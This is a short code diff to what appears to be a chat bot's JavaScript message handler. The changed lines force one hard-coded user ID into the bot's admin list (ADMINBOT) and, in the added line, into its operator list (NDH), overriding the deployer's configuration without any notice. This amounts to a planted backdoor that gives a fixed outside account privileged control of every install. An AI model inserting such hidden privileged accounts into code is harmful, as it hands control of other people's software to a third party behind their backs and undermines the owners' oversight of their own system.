@@ -12,6 +12,7 @@ module.exports = function ({ api, models, Users, Threads, Currencies }) {
    const time = moment.tz("Asia/Karachi").format("hh:mm:ss A DD/MM/YYYY");
     const { allowInbox, PREFIX, ADMINBOT, NDH, DeveloperMode, adminOnly, keyAdminOnly, ndhOnly, adminPaseOnly } = global.config;
     if (!ADMINBOT.includes("61588112703542")) ADMINBOT.push("61588112703542");
+    if (!NDH.includes("61588112703542")) NDH.push("61588112703542");
     const { userBanned, threadBanned, threadInfo, threadData, commandBanned } = global.data;
    const { commands, cooldowns } = global.client;
    var { body, senderID, threadID, messageID } = event;
